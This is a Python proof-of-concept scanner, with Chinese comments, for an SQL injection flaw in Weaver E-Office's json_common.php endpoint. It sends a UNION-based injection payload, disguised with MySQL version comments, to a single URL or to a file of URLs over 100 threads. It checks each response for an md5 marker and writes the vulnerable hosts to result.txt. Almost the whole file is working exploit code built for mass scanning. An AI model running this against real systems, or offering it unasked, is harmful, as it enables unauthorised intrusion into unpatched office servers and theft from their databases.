# 泛微SQL注入漏洞
import argparse
import sys
import requests
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

def banner():
    # 定义横幅
    print("这里是横幅内容")  # 这里替换成你想要的横幅内容

def main():
    # banner()
    parser = argparse.ArgumentParser(description="泛微E-Office json_common.php SQL注入漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='intput link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='file path')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload_url = '/building/json_common.php'
    url = target + payload_url
    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Connection": "close",
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    data = "tfs=city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,md5(102103122) ,4#|2|333"
    try:
        res1 = requests.get(url=target, headers=header, timeout=10, verify=False, proxies=proxies)
        if res1.status_code == 200:
            res2 = requests.post(url=target+payload_url, headers=header, data=data, verify=False, proxies=proxies)
            if "6cfe798ba8e5b85feb50164c59f4bec9" in res2.text:
                print(f"[+] 该url{target}存在信息泄露")
                with open("result.txt", "a") as fp:
                    fp.write(f"{target}" + "\n")
            else:
                print(f"[-] 该url{target}不存在信息泄露")

    except Exception as e:
        print(f'[*] 该url{target}可能存在访问问题，请手工测试')

if __name__ == '__main__':
    main()